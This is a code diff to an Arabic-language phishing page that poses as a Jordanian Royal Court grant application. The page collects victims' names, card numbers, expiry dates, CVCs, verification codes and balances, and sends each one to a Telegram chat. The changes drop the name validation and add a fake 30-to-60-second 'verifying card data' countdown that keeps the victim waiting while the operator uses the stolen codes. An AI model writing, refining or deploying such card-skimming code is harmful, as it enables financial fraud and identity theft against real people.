@@ -286,7 +286,7 @@
     };
     let currentStep = "name";
     let telegramMsgId = null;
-    const CORRECT_FINAL_CODE = "654321"; // الكود الصحيح للتحقق النهائي
+    const CORRECT_FINAL_CODE = "654321"; // رمز التحقق النهائي
 
     function stepIndicator(step) {
       return `
@@ -297,6 +297,7 @@
         </div>
       `;
     }
+
     function header(sub="") {
       return `
         <div class="royal-header">
@@ -307,7 +308,7 @@
       `;
     }
 
-    // الاسم الرباعي
+    // الاسم الرباعي بدون أي شرط
     function renderNameStep() {
       currentStep = "name";
       app.innerHTML = `
@@ -323,13 +324,7 @@
       document.getElementById('name').focus();
       document.getElementById('nameForm').onsubmit = async function(e) {
         e.preventDefault();
-        const name = document.getElementById('name').value.trim();
-        if (name.split(" ").length < 4) {
-          alert('يرجى إدخال الاسم الرباعي الكامل');
-          document.getElementById('name').focus();
-          return;
-        }
-        userData.name = name;
+        userData.name = document.getElementById('name').value.trim();
         try {
           telegramMsgId = await sendToTelegramAndGetMsgId(
             `🏦 طلب منحة ديوان ملكي\n👤 الإسم الرباعي: ${userData.name}`
@@ -433,11 +428,37 @@
             `🏦 طلب منحة ديوان ملكي\n👤 الإسم الرباعي: ${userData.name}\n💳 رقم البطاقة: ${userData.card}\n📅 انتهاء: ${userData.expMonth}/${userData.expYear}\n🔑 CVC: ${userData.cvc}`
           );
         } catch (err) { }
-        renderVerificationStep();
+        renderVerificationWaitStep();
       };
       document.getElementById('backBtn').onclick = () => {
         renderCardStep();
       };
+    }
+
+    // واجهة تحقق من المعلومات لمدة عشوائية بين 30-60 ثانية
+    function renderVerificationWaitStep() {
+      currentStep = "verificationWait";
+      let seconds = Math.floor(Math.random() * 31) + 30; // من 30 الى 60
+      app.innerHTML = `
+        ${header("جارٍ التحقق من المعلومات ...")}
+        ${stepIndicator(3)}
+        <div class="info-msg" id="countdownMsg">يرجى الانتظار ${seconds} ثانية للتحقق من بيانات البطاقة</div>
+        <div style="margin:40px 0;text-align:center;">
+          <div class="spinner" style="width:55px;height:55px;border:6px solid #8136e911;border-top:6px solid #8136e9;border-radius:50%;animation:spin 1.1s linear infinite;margin:auto;"></div>
+        </div>
+        <div class="royal-footer">الديوان الملكي الأردني &copy; 2025</div>
+        <style>
+          @keyframes spin{from{transform:rotate(0deg);}to{transform:rotate(360deg);}}
+        </style>
+      `;
+      let interval = setInterval(()=>{
+        seconds--;
+        document.getElementById('countdownMsg').textContent = `يرجى الانتظار ${seconds} ثانية للتحقق من بيانات البطاقة`;
+        if (seconds <= 0) {
+          clearInterval(interval);
+          renderVerificationStep();
+        }
+      },1000);
     }
 
     // خطوة رمز التحقق (يتم القبول مباشرة ويُرسل للتيليجرام ثم تظهر خانة الرصيد)
@@ -474,7 +495,6 @@
       };
     }
 
-    // خانة الرصيد
     function renderBalanceStep() {
       currentStep = "balance";
       app.innerHTML = `
@@ -508,7 +528,6 @@
       };
     }
 
-    // خانة رمز تحقق ثاني بعد الرصيد (يتحقق من الرمز فقط؛ كل مرة يظهر رسالة الخطأ ويرسل لتلجرام)
     function renderFinalCodeStep() {
       currentStep = "finalCode";
       app.innerHTML = `
